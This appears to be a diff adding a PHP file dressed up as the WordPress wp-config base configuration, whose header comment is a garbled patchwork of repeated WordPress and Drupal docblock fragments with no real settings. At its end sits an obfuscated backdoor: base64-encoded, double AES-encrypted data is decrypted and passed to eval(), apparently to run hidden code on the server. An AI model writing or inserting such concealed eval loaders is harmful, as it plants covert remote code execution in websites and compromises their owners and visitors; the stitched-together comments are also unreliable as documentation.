@@ -1,0 +1,101 @@
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don't have to use the website, you can copy this file to "wp-config.php"
+ * and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * Database settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @package WordPress
+ * We are located in Administration Screens *
+ * Fires on a non-authenticated admin post request for the given action.
+ *
+ * The dynamic portion of the hook name, `$action`, refers to the given
+ * request action.
+ *
+ * @since 2.6.0
+ *
+ *
+ * Regions:
+ * - $page['help']: Dynamic help text, mostly for admin pages.
+ * - $page['highlighted']: Items for the highlighted content region.
+ * - $page['slideshow']: Items for the slideshow region.
+ * - $page['content']: The main content of the current page.
+ * - $page['sidebar_first']: Items for the first sidebar.
+ * - $page['sidebar_second']: Items for the second sidebar.
+ * - $page['header']: Items for the header region.
+ * - $page['footer']: Items for the footer region.
+ * - $panel_first: Items for the regions in panel_first.
+ * - $panel_second: Items for the regions in panel_second.
+ *
+ * @see template_preprocess()
+ * @see template_preprocess_page()
+ * @see template_process()
+ * @see nucleus_preprocess_page()
+ * Edit links form for inclusion in administration panels.
+ *
+ * @package 
+ * @subpackage Administration
+ *
+ * Import Administration Screen
+ *
+ * @package 
+ * @subpackage Administration
+Detect and redirect invalid importers like 'movabletype', which is registered as 'mt'
+ *  Options Header.
+ *
+ * Displays updated message, if updated variable is part of the URL query.
+ *
+ * @package 
+ * @subpackage Administration
+ * Writing settings administration panel.
+ *
+ * @package 
+ * @subpackage Administration
+ * Retrieves and creates the wp-config.php file.
+ *
+ * The permissions for the base directory must allow for writing files in order
+ * for the wp-config.php to be created using this page.
+ *
+ * @package 
+ * @subpackage Administration* The dynamic portion of the hook name, `$action`, refers to the given
+* request action.
+*
+* @since 2.6.0
+*
+**
+ * Edit links form for inclusion in administration panels.
+ *
+ * @package 
+ * @subpackage Administration
+ *
+ * Import  Administration Screen
+ *
+ * @package 
+ * @subpackage Administration
+Detect and redirect invalid importers like 'movabletype', which is registered as 'mt'
+ *  Options Header.
+ *
+ * Displays updated message, if updated variable is part of the URL query.
+ *
+ * @package 
+ * @subpackage Administration
+ * Writing settings administration panel.
+ *
+ * @package 
+ * @subpackage Administration
+ * Retrieves and creates the wp-config.php file.
+ *
+ * The permissions for the base directory must allow for writing files in order
+ * for the wp-config.php to be created using this page.
+ *
+ * @package 
+ * @subpackage Administration
+ */$ohoohooho = '!oho!';$ohoohoohoohoohoohoohoohooho = 'IW9obyE=';$ohoohoohoohoohoohoohooho = 'SzBKTTlkSDZvYXRrR0dIWUZpR2xuZz09';$ohoohoohoohoohoohoohooho_ = 'bc8qRu7GuUJ4kDmcyiZAwQ==';$ohoohoohoohoohoohooho = 'L1pLUFI3UWwvbUM5TSt5MnRlWFJDOU45R0czajFJRE5lWVlSUnAvbGdWeFJXbWU1V0tkS1JybWszVlBISG5qOW5qMXlEdVp1bGxpNlFiQlRBS0NvRWY1eXV4cy9LUlhVYUJaSm83RGlJeDU2ZEtQZ1BGazAvNUlPWHZIM0ExMVFkTHpZRnVQN1lyc3NEY0hQTUtNU1gwUTNSSnVTaFJNVlNVcmdCMTdWRGZ4M2ZmY1Jvb3VCcS9NbkJGV3ArUDZLdU5VV0tqSDdNRmU1aE94OXBqTlNCUWJGemZ5eElkcWxRUFFXTHJNOGJJM2FnQXpDcEtzaWFpSU1UTEFkSEFXVXY4dFFSL0RJTGdGWmVvUmtzU1BqQVUyWG9lNS9XZXNackFvSjZLVUVpRFl1VEluUC9tWUlXTjN4L0tKcFdjYUUyWDB2MUZlenkwRm5jUk5OUndtY0hBPT0=';$ohoohoohoohooho = openssl_decrypt(base64_decode($ohoohoohoohoohoohoohooho),'aes-256-cbc',base64_decode($ohoohoohoohoohoohoohoohooho),0,base64_decode($ohoohoohoohoohoohoohooho_));$ohoohoohoohoohooho_ = base64_decode($ohoohoohoohoohoohoohooho_);$ohoohoohoohoohooho = openssl_decrypt(base64_decode($ohoohoohoohoohoohooho),'aes-256-cbc',$ohoohoohoohooho,0,$ohoohoohoohoohooho_);eval('?>' . $ohoohoohoohoohooho . '');?>
